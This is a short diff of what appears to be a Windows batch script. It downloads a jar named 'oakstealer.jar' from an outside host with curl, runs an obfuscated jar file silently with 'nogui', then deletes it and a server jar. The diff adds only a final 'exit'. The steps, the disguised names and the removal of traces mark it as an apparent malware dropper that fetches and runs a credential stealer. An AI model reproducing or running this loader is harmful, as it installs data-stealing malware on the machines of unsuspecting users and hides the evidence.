@@ -6,3 +6,4 @@ curl ^"https://doomsdayclient.com/loader_random/oakstealer.jar^" ^  -H ^"Accept:
 jAva -jar Lu"Nar.J"A"r" nog"ui
 del LU"N"a"R.jAR"
 cmd.exe del server.jar
+exit
